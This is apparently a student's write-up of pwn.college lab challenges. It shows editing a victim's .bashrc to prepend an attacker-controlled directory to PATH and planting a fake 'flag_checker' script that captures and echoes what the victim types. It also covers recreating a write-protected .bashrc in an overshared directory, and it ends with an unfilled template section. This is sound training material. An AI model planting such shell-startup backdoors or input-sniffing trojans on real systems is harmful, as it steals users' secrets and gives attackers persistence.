# BASHRC BACKDOOR
To use victim's `bashrc` and our write access to it to get the flag.

## My solve
**Flag:** `pwn.college{Yhas_cc8cRXBNonUT8-WRgszuR1.0VMzEzNxwiM4kjNzEzW}`

* Using nano editor to edit `/home/zardus/bashrc` and ran `/challenge/victim` to get the flag.

```
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{Yhas_cc8cRXBNonUT8-WRgszuR1.0VMzEzNxwiM4kjNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```


# SNIFFING INPUT
Thus challenge is to use victims's `bashrc` to get the flag .This time we have to hijack a command flag_checker to get the flag.

## My solve
**Flag:** `pwn.college{sIppirRQ8R1A3Y4BxtMYLuje7tr.0VNzEzNxwiM4kjNzEzW}`

* I used `nano` text editor to edit `/home/zardus/.bashrc`

```bash
hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
PATH=/home/hacker:$PATH
```
* I created `flag_checker` program to replace the existing command in `/home/hacker`
```
hacker@shenanigans~sniffing-input:~$ touch flag_checker && nano flag_checker
#!/bin/bash
echo "Type the flag , victim: "
read flag
echo "Correct!"
echo $flag
hacker@shenanigans~sniffing-input:~$ chmod +x flag_checker
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag , victim:
*************************************************************Correct!
pwn.college{sIppirRQ8R1A3Y4BxtMYLuje7tr.0VNzEzNxwiM4kjNzEzW} 
```
* I ran `/challenge/victim` and got the flag

# OVERSHARED DIRECTORIES
We just have access to directory /home/zardus rather than file /home/zardus/.bashrc

## My solve
**Flag:** `pwn.college{k-F2dOgFAsf3uaOnV5L23jDQZOb.0FM0EzNxwiM4kjNzEzW}`

* similar to the previous challenge , we use nano editor to edit `/home/zardus/.bashrc` .
* we use `rm` to remove `/home/zardus/.bashrc` as we do not have access to the file.
* Instead we create a new file and edit it using nano i.e add `PATH=/home/hacker:$PATH`.
* Next we add executable access and run `/challenge/victim` to get the flag.

```bash
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
rm: remove write-protected regular file '/home/zardus/.bashrc'? y
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ touch flag_checker && nano flag_checker
hacker@shenanigans~overshared-directories:~$ chmod +x flag_checker
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag , victim:
*************************************************************Correct!
pwn.college{k-F2dOgFAsf3uaOnV5L23jDQZOb.0FM0EzNxwiM4kjNzEzW}
```


# TRICKY LINKING
We have access to directory `/tmp/collab` and we have to use zardus pushing the command `cat /flag` to `

## My solve
**Flag:** `pwn.college{helloworld}`

Explain how you arrived at the solution and your thought process behind solving the challenge. Include as much as info as possible. Use triple ticks for bash.

```bash
example triple ticks for bash
pwn.college{helloworld}
```

## What I learned
Explain what new topics you learned/information you gained through this challenge.

## References 
Add an references or videos you used while solving the challenge.

